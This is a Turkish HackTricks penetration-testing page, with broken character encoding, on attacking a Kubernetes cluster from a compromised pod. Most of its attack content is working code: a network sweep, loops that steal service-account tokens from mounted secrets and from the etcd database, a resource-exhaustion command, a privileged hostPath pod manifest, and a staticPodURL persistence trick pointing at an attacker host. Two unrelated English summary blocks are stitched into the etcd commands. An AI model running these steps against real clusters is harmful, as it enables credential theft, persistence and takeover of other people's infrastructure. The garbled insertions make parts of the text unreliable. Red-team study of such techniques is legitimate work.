# Pod Ä°Ã§inden Kubernetes SaldÄ±rÄ±sÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na(https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)'de **takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## **Pod KaÃ§Ä±ÅŸÄ±**

**ÅanslÄ±ysanÄ±z, pod'dan kaÃ§abilirsiniz:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Pod'dan KaÃ§Ä±ÅŸ

Pod'lardan kaÃ§maya Ã§alÄ±ÅŸmak iÃ§in genellikle Ã¶nce **yetkileri yÃ¼kseltmeniz** gerekebilir, bunu yapmak iÃ§in bazÄ± teknikler:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Kompromize ettiÄŸiniz bir pod'dan kaÃ§maya Ã§alÄ±ÅŸmak iÃ§in bu **docker kaÃ§Ä±ÅŸlarÄ±nÄ± kontrol edebilirsiniz**:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Kubernetes Yetkilerinin KÃ¶tÃ¼ye KullanÄ±mÄ±

**Kubernetes numaralandÄ±rmasÄ±** bÃ¶lÃ¼mÃ¼nde aÃ§Ä±klandÄ±ÄŸÄ± gibi:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Genellikle pod'lar iÃ§inde bir **hizmet hesabÄ± belirteci** Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. Bu hizmet hesabÄ±, **kÃ¶tÃ¼ye kullanabileceÄŸiniz bazÄ± yetkilere sahip** olabilir, diÄŸer pod'lara veya hatta kÃ¼me iÃ§inde yapÄ±landÄ±rÄ±lmÄ±ÅŸ dÃ¼ÄŸÃ¼mlere **geÃ§mek** iÃ§in bunlarÄ± **kÃ¶tÃ¼ye kullanabilirsiniz**. NasÄ±l yapÄ±lacaÄŸÄ±nÄ± kontrol edin:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Bulut Yetkilerinin KÃ¶tÃ¼ye KullanÄ±mÄ±

Pod bir **bulut ortamÄ±nda** Ã§alÄ±ÅŸtÄ±rÄ±lÄ±yorsa, **metadata uÃ§ noktasÄ±ndan bir belirteÃ§ sÄ±zdÄ±rabilir** ve bunu kullanarak yetkileri yÃ¼kseltebilirsiniz.

## ZayÄ±f AÄŸ Hizmetlerini ArayÄ±n

Kubernetes ortamÄ±nda olduÄŸunuz iÃ§in, mevcut pod'un yetkilerini kÃ¶tÃ¼ye kullanarak yetkileri yÃ¼kseltemiyorsanÄ±z ve konteynerden kaÃ§amÄ±yorsanÄ±z, **potansiyel zayÄ±f hizmetleri aramalÄ±sÄ±nÄ±z.**

### Hizmetler

**Bu amaÃ§la, kubernetes ortamÄ±ndaki tÃ¼m hizmetleri almayÄ± deneyebilirsiniz:**
```
kubectl get svc --all-namespaces
```
VarsayÄ±lan olarak, Kubernetes dÃ¼z bir aÄŸ ÅŸemasÄ± kullanÄ±r, bu da **kÃ¼me iÃ§indeki herhangi bir pod/servisin birbirleriyle iletiÅŸim kurabileceÄŸi anlamÄ±na gelir**. KÃ¼me iÃ§indeki **ad alanlarÄ± varsayÄ±lan olarak herhangi bir aÄŸ gÃ¼venliÄŸi kÄ±sÄ±tlamasÄ±na sahip deÄŸildir**. Ad alanÄ±ndaki herkes diÄŸer ad alanlarÄ±yla iletiÅŸim kurabilir.

### Tarama

AÅŸaÄŸÄ±daki Bash betiÄŸi (bir [Kubernetes atÃ¶lyesinden alÄ±nmÄ±ÅŸtÄ±r](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) kubernetes kÃ¼mesinin IP aralÄ±klarÄ±nÄ± yÃ¼kleyip tarama yapacaktÄ±r:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
AÅŸaÄŸÄ±daki sayfayÄ± inceleyerek **Kubernetes Ã¶zel servislerine saldÄ±rabileceÄŸinizi** ve **diÄŸer podlarÄ±/tÃ¼m ortamÄ± tehlikeye atabileceÄŸinizi** Ã¶ÄŸrenin:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### Sniffing

EÄŸer **kompromize edilmiÅŸ pod hassas bir servis Ã§alÄ±ÅŸtÄ±rÄ±yorsa** ve diÄŸer pod'larÄ±n kimlik doÄŸrulamasÄ± yapmasÄ± gerekiyorsa, diÄŸer pod'lardan gelen kimlik bilgilerini **yerel iletiÅŸimi dinleyerek** elde edebilirsiniz.

## Network Spoofing

VarsayÄ±lan olarak **ARP spoofing** gibi teknikler (ve buna baÄŸlÄ± olarak **DNS Spoofing**) Kubernetes aÄŸÄ±nda Ã§alÄ±ÅŸÄ±r. Sonra, bir pod iÃ§inde, **NET\_RAW yeteneÄŸine** sahipseniz (bu varsayÄ±lan olarak mevcuttur), Ã¶zel oluÅŸturulmuÅŸ aÄŸ paketleri gÃ¶nderebilir ve **aynÄ± dÃ¼ÄŸÃ¼mde Ã§alÄ±ÅŸan tÃ¼m pod'lara ARP Spoofing aracÄ±lÄ±ÄŸÄ±yla MitM saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirebilirsiniz.**\
DahasÄ±, eÄŸer **zararlÄ± pod** DNS Sunucusu ile **aynÄ± dÃ¼ÄŸÃ¼mde Ã§alÄ±ÅŸÄ±yorsa**, tÃ¼m kÃ¼medeki pod'lara **DNS Spoofing saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilirsiniz**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

Kubernetes belgelerinde kaynaklarÄ±n belirtilmediÄŸi ve konteynerler iÃ§in **uygulanmamÄ±ÅŸ sÄ±nÄ±rlarÄ±n** olmadÄ±ÄŸÄ± belirtilmemiÅŸtir. Bir saldÄ±rgan olarak, **pod/deployment'Ä±n Ã§alÄ±ÅŸtÄ±ÄŸÄ± kaynaklarÄ± tÃ¼ketebiliriz** ve diÄŸer kaynaklarÄ± tÃ¼keterek ortam iÃ§in bir DoS oluÅŸturabiliriz.

Bu, [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng) gibi bir araÃ§la yapÄ±labilir:
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
`stress-ng` Ã§alÄ±ÅŸÄ±rken ve sonrasÄ±ndaki farkÄ± gÃ¶rebilirsiniz
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Node SaldÄ±rÄ± SonrasÄ± Ä°stismarÄ±

EÄŸer **konteynerden kaÃ§mayÄ±** baÅŸardÄ±ysanÄ±z, dÃ¼ÄŸÃ¼mde bulabileceÄŸiniz ilginÃ§ ÅŸeyler ÅŸunlardÄ±r:

* **Konteyner Ã‡alÄ±ÅŸtÄ±rma** iÅŸlemi (Docker)
* Daha fazla dÃ¼ÄŸÃ¼mde Ã§alÄ±ÅŸan **pods/konteynerler** bu Ã¶rnekte olduÄŸu gibi kÃ¶tÃ¼ye kullanabileceÄŸiniz (daha fazla belirteÃ§)
* TÃ¼m **dosya sistemi** ve **iÅŸletim sistemi** genel olarak
* Dinleyen **Kube-Proxy** servisi
* Dinleyen **Kubelet** servisi. YapÄ±landÄ±rma dosyalarÄ±nÄ± kontrol edin:
* Dizin: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* DiÄŸer **kubernetes ortak dosyalarÄ±**:
* `$HOME/.kube/config` - **KullanÄ±cÄ± YapÄ±landÄ±rmasÄ±**
* `/etc/kubernetes/kubelet.conf`- **Normal YapÄ±landÄ±rma**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Ã–nyÃ¼kleme YapÄ±landÄ±rmasÄ±**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcd YapÄ±landÄ±rmasÄ±**
* `/etc/kubernetes/pki` - **Kubernetes AnahtarÄ±**

### DÃ¼ÄŸÃ¼m kubeconfig DosyasÄ±nÄ± Bulma

EÄŸer Ã¶nceden yorumlanan yollardan birinde kubeconfig dosyasÄ±nÄ± bulamÄ±yorsanÄ±z, kubelet iÅŸleminin `--kubeconfig` argÃ¼manÄ±nÄ± kontrol edin:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### SÄ±rlarÄ± Ã‡alma
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
The script [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) will automatically **get the tokens of other pods and check if they have the permission** you are looking for (instead of you looking 1 by 1):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### AyrÄ±calÄ±klÄ± DaemonSet'ler

Bir DaemonSet, **kÃ¼menin tÃ¼m dÃ¼ÄŸÃ¼mlerinde Ã§alÄ±ÅŸacak olan bir pod**'dur. DolayÄ±sÄ±yla, bir DaemonSet, **ayrÄ±calÄ±klÄ± bir hizmet hesabÄ±yla yapÄ±landÄ±rÄ±lmÄ±ÅŸsa,** **TÃœM dÃ¼ÄŸÃ¼mlerde** o **ayrÄ±calÄ±klÄ± hizmet hesabÄ±nÄ±n belirteÃ§**ini bulabileceksiniz ve bunu istismar edebileceksiniz.

SaldÄ±rÄ±, Ã¶nceki bÃ¶lÃ¼mde olduÄŸu gibi aynÄ±dÄ±r, ancak artÄ±k ÅŸansa baÄŸlÄ± deÄŸilsiniz.

### Buluta GeÃ§iÅŸ Yapma

KÃ¼me bir bulut hizmeti tarafÄ±ndan yÃ¶netiliyorsa, genellikle **DÃ¼ÄŸÃ¼mÃ¼n Pod'dan farklÄ± bir eriÅŸimi olacaktÄ±r**. Bu nedenle, **dÃ¼ÄŸÃ¼mden metadata uÃ§ noktasÄ±na eriÅŸmeye Ã§alÄ±ÅŸÄ±n** (veya hostNetwork'Ã¼ True olan bir pod'dan):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### etcd'yi Ã‡alma

EÄŸer konteynerÄ± Ã§alÄ±ÅŸtÄ±racak olan **DÃ¼ÄŸÃ¼mÃ¼n nodeName'ini** belirtebiliyorsanÄ±z, bir kontrol dÃ¼ÄŸÃ¼mÃ¼ iÃ§inde bir kabuk alÄ±n ve **etcd veritabanÄ±nÄ±** alÄ±n:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
Kontrol dÃ¼ÄŸÃ¼mleri **ana bilgisayar rolÃ¼ne** sahiptir ve **bulut yÃ¶netimli kÃ¼melerde bunlarda herhangi bir ÅŸey Ã§alÄ±ÅŸtÄ±ramazsÄ±nÄ±z**.

#### Etcd'den sÄ±rlarÄ± okuyun

Pod Ã¶zelliklerinde `nodeName` seÃ§icisini kullanarak pod'unuzu bir kontrol dÃ¼ÄŸÃ¼mÃ¼nde Ã§alÄ±ÅŸtÄ±rabiliyorsanÄ±z, `etcd` veritabanÄ±na kolayca eriÅŸebilirsiniz. Bu veritabanÄ±, tÃ¼m yapÄ±landÄ±rmalarÄ± ve tÃ¼m sÄ±rlarÄ± iÃ§eren kÃ¼me iÃ§in tÃ¼m yapÄ±landÄ±rmalarÄ± iÃ§erir.

AÅŸaÄŸÄ±da, Ã¼zerinde Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±z kontrol dÃ¼ÄŸÃ¼mÃ¼nde Ã§alÄ±ÅŸÄ±yorsa `etcd` veritabanÄ±ndan sÄ±rlarÄ± almanÄ±n hÄ±zlÄ± ve kirli bir yolunu bulabilirsiniz. EÄŸer `etcd` istemcisini `etcdctl` ile kullanan ve kontrol dÃ¼ÄŸÃ¼mÃ¼ dÃ¼ÄŸÃ¼mÃ¼nÃ¼n kimlik bilgilerini kullanarak nerede Ã§alÄ±ÅŸÄ±yor olursa olsun etcd'ye baÄŸlanan daha zarif bir Ã§Ã¶zÃ¼m isterseniz, @mauilion'un [bu Ã¶rnek manifestosuna](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) gÃ¶z atÄ±n.

**Kontrol dÃ¼ÄŸÃ¼mÃ¼nde `etcd`'nin Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± ve veritabanÄ±nÄ±n nerede olduÄŸunu kontrol edin (Bu, bir `kubeadm` oluÅŸturulan kÃ¼mede bulunmaktadÄ±r)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, they are already inside the cluster and can potentially access other pods and services. This section covers various techniques an attacker can use to escalate privileges and move laterally within the cluster.

### Escalating Privileges

#### Accessing the Kubernetes API

If the pod has a service account token mounted, the attacker can use it to access the Kubernetes API and perform actions based on the permissions associated with that service account.

#### Exploiting Kubernetes RBAC

If the pod has excessive permissions assigned via Role-Based Access Control (RBAC), the attacker can abuse these permissions to perform unauthorized actions within the cluster.

### Moving Laterally

#### Port Forwarding

The attacker can use port forwarding to access services running on other pods within the cluster, allowing them to interact with those services as if they were running on their local machine.

#### Pod to Pod Communication

By leveraging the Kubernetes DNS service, the attacker can communicate with other pods directly, potentially exfiltrating data or performing further attacks.

### Conclusion

Securing Kubernetes pods is crucial to prevent attackers from moving laterally within the cluster and escalating privileges. Regularly auditing and updating RBAC permissions, restricting service account access, and monitoring pod-to-pod communication are essential steps to enhance Kubernetes security.
```
```bash
data-dir=/var/lib/etcd
```
**etcd veritabanÄ±ndaki verileri gÃ¶rÃ¼ntÃ¼le:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**VeritabanÄ±ndan tokenleri Ã§Ä±karÄ±n ve servis hesabÄ± adÄ±nÄ± gÃ¶sterin**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**AynÄ± komut, ancak yalnÄ±zca kube-system ad alanÄ±ndaki varsayÄ±lan belirteci dÃ¶ndÃ¼rmek iÃ§in bazÄ± grepler**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, they are in a privileged position to perform further attacks within the cluster. This section outlines some common techniques attackers can use to escalate privileges and move laterally within a Kubernetes cluster from inside a compromised pod.

### Privilege Escalation

#### Exploiting Misconfigured RBAC Roles

Attackers can abuse misconfigured Role-Based Access Control (RBAC) roles to gain higher privileges within the cluster. By modifying existing roles or creating new ones, attackers can grant themselves additional permissions to perform malicious actions.

#### Accessing the Kubernetes API Server

Once inside a pod, attackers can attempt to access the Kubernetes API server using tools like `kubectl` or client libraries. If the pod's service account has sufficient permissions, attackers can interact with the API server to gather information about the cluster or perform actions on other resources.

### Lateral Movement

#### Pod Hopping

Attackers can move laterally within the cluster by compromising multiple pods. By exploiting vulnerabilities or misconfigurations in other pods, attackers can pivot from one pod to another, gradually expanding their control over the cluster.

#### Service Account Compromise

If an attacker can compromise a pod's service account token, they can impersonate the account and access other resources within the cluster that the account has permissions for. This can allow the attacker to move laterally and escalate privileges further.

### Conclusion

Securing Kubernetes clusters requires not only protecting the external attack surface but also monitoring and securing internal components like pods. By understanding common attack techniques from inside a pod, defenders can better protect their clusters against malicious actors.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Statik/YansÄ±tÄ±lmÄ±ÅŸ Pod KalÄ±cÄ±lÄ±ÄŸÄ±

_Static Pods_, API sunucusunun onlarÄ± gÃ¶zlemlememesi durumunda belirli bir dÃ¼ÄŸÃ¼mde kubelet daemonu tarafÄ±ndan doÄŸrudan yÃ¶netilen podlardÄ±r. Kontrol dÃ¼zlemi tarafÄ±ndan yÃ¶netilen Pod'larÄ±n aksine (Ã¶rneÄŸin, bir DaÄŸÄ±tÄ±m); **kubelet her statik Pod'u izler** (ve baÅŸarÄ±sÄ±z olursa yeniden baÅŸlatÄ±r).

Bu nedenle, statik Pod'lar her zaman belirli bir dÃ¼ÄŸÃ¼mdeki bir Kubelet'e **baÄŸlÄ±dÄ±r**.

**Kubelet otomatik olarak her statik Pod iÃ§in Kubernetes API sunucusunda bir ayna Pod oluÅŸturmaya Ã§alÄ±ÅŸÄ±r**. Bu, bir dÃ¼ÄŸÃ¼mde Ã§alÄ±ÅŸan Pod'larÄ±n API sunucusunda gÃ¶rÃ¼nÃ¼r olduÄŸu, ancak oradan kontrol edilemediÄŸi anlamÄ±na gelir. Pod adlarÄ±, baÅŸÄ±nda bir tire ile dÃ¼ÄŸÃ¼m ana bilgisayar adÄ±yla eklenir.

{% hint style="danger" %}
Bir statik Pod'un **`spec`'i diÄŸer API nesnelerine** (Ã¶rneÄŸin, ServiceAccount, ConfigMap, Secret, vb.) **atÄ±fta bulunamaz**. Bu nedenle, mevcut dÃ¼ÄŸÃ¼mde **keyfi bir serviceAccount ile bir pod baÅŸlatmak iÃ§in bu davranÄ±ÅŸÄ± kÃ¶tÃ¼ye kullanamazsÄ±nÄ±z**. Ancak bunu kullanarak farklÄ± ad alanlarÄ±nda pod'larÄ± Ã§alÄ±ÅŸtÄ±rabilirsiniz (bu bazÄ± nedenlerle faydalÄ± olabilir).
{% endhint %}

EÄŸer dÃ¼ÄŸÃ¼m ana bilgisayar iÃ§indeyseniz, **kendi iÃ§inde bir statik pod oluÅŸturmasÄ±nÄ± saÄŸlayabilirsiniz**. Bu oldukÃ§a faydalÄ± olabilir Ã§Ã¼nkÃ¼ size **kube-system** gibi **farklÄ± bir ad alanÄ±nda pod oluÅŸturma imkanÄ±** verebilir.

Statik bir pod oluÅŸturmak iÃ§in, [**belgeler bÃ¼yÃ¼k bir yardÄ±mcÄ±dÄ±r**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Temelde 2 ÅŸeye ihtiyacÄ±nÄ±z var:

* **`--pod-manifest-path=/etc/kubernetes/manifests`** parametresini **kubelet servisinde** veya **kubelet yapÄ±landÄ±rmasÄ±nda** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) yapÄ±landÄ±rÄ±n ve servisi yeniden baÅŸlatÄ±n
* **`/etc/kubernetes/manifests`** iÃ§inde **pod tanÄ±mÄ±** oluÅŸturun

**Daha gizli bir yol ÅŸÃ¶yle olabilir:**

* **kubelet** yapÄ±landÄ±rma dosyasÄ±ndaki **`staticPodURL`** parametresini deÄŸiÅŸtirin ve `staticPodURL: http://saldÄ±rgan.com:8765/pod.yaml` gibi bir ÅŸey ayarlayÄ±n. Bu, kubelet iÅŸleminin **belirtilen URL'den yapÄ±landÄ±rmayÄ± alarak bir statik pod oluÅŸturmasÄ±nÄ± saÄŸlayacaktÄ±r**.

**Ã–rnek** olarak, **kube-system** iÃ§inde bir ayrÄ±calÄ±klÄ± pod oluÅŸturmak iÃ§in **pod** yapÄ±landÄ±rmasÄ± [**buradan**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/) alÄ±nmÄ±ÅŸtÄ±r:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### PodlarÄ± silme + Ã§alÄ±ÅŸtÄ±rÄ±lamaz dÃ¼ÄŸÃ¼mler

Bir saldÄ±rgan bir dÃ¼ÄŸÃ¼mÃ¼ **ele geÃ§irdiyse** ve diÄŸer dÃ¼ÄŸÃ¼mlerden **podlarÄ± silebiliyorsa** ve **diÄŸer dÃ¼ÄŸÃ¼mlerin podlarÄ± Ã§alÄ±ÅŸtÄ±ramayacak ÅŸekilde yapabiliyorsa**, podlar ele geÃ§irilmiÅŸ dÃ¼ÄŸÃ¼mde yeniden Ã§alÄ±ÅŸtÄ±rÄ±lacak ve iÃ§lerinde Ã§alÄ±ÅŸan **token'larÄ± Ã§alabilecektir**.\
Daha fazla bilgi iÃ§in [**bu baÄŸlantÄ±larÄ± takip edin**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Otomatik AraÃ§lar

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahraman olmaya kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**'yi takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na. 

</details>
